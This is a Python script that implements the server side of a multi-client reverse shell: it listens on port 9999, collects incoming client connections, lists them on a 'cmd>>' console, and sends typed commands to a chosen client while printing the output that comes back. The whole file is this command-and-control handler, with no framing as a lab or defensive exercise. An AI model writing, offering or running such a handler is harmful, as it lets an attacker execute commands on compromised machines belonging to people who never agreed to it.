import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2

JOB_NUMBER = [1,2]

queue = Queue()

all_conn = []
all_address = []

def create_socket():
	
	global host
	global port
	global s
	try:
		host = "" 
		port = 9999
		s = socket.socket()
		

	except socket.error as msg:
		print( "Socket Creation Error {}".format(msg) )


def bind_socket():
	try:
		print( "Binding the Port {}".format(port) )

		s.bind( ( host, port ) )
		s.listen(5)

		print("Listning...")

	except socket.error as msg:
		print(" Socket Binding Error {}\n Retrying......".format(msg) )
		bind_socket()

def socket_accepting():

	for c in all_conn:
		c.close()

	del all_conn[:]
	del all_address[:]

	while True:
		try:
			conn, address = s.accept()
			# print(conn,address)
			s.setblocking(1) #preventing timeout

			all_conn.append( conn )
			all_address.append( address )
			print("Connection has been Established! IP:{} PORT:{}".format( address[0],address[1] ) )
		except:
			print("Error accepting connections")


#Send command to client 
def send_command(conn):

	while True:
		cmd = input(">")

		if cmd=="quit":
			break

		if len(str.encode( cmd )) > 0 :
			conn.send( str.encode(cmd) )
			client_response = str( conn.recv(1024), "utf-8" )
			print( client_response, end="" ) 	

def input_command():

	while True:
		cmd = input("cmd>>")
		if cmd=="quit":
			for i in all_conn:
				i.close()
			s.close()
			sys.exit()

		elif cmd=="list":

			clients = []
			for i in range(len(all_address)):

				try:
					all_conn[i].send( str.encode( " " ) )
					all_conn[i].recv(201480)
				except:
					del all_conn[i]
					del all_address[i]
					continue


				clients.append( "{}: IP={} PORT={}".format( i+1, all_address[i][0], all_address[i][1] ) )

			print("----Clients----")
			print(*clients, sep="\n")


		elif cmd.split()[0]=="select":
			index = int(cmd.split()[1]) - 1
			print("You are now connected to: {}".format( all_address[index][0] ) )
			send_command( all_conn[index] )

		else:
			print("Command Not Recognised! ")


def create_worker():

	for i in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

def create_job():

	for i in JOB_NUMBER:
		queue.put(i)

	queue.join()

def work():
	
	while True:

		x = queue.get()
		if x==1:
			create_socket()
			bind_socket()
			socket_accepting()
		elif x==2:
			input_command()



create_worker()
create_job()
